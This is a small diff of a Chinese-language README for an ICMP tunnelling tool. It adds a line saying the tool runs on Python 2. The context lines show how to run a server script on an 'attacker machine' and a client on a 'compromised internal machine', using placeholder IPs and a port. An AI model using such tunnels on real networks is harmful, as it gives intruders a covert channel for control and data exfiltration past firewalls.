@@ -1,4 +1,5 @@
 # Icmp_tunnel ICMP隧道 
+运行环境：python2  
 外网攻击机：python IcmpTunnel_S.py  
 内网失陷机：python IcmpTunnel_C.py 外网攻击机IP 内网失陷机IP 端口号  
 ```shell
